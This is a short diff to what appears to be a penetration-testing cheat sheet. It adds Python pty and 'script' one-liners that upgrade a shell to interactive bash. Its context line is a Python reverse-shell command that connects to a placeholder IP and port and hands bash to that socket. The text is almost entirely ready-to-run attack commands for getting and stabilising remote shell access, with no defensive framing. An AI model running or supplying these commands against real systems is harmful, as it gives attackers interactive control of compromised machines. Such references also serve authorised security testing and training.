@@ -141,6 +141,9 @@ Method 3: Using Script
 ```bash
 #Python
 python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/script -qc /bin/bash /dev/null
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 #non python shell (not 100%)
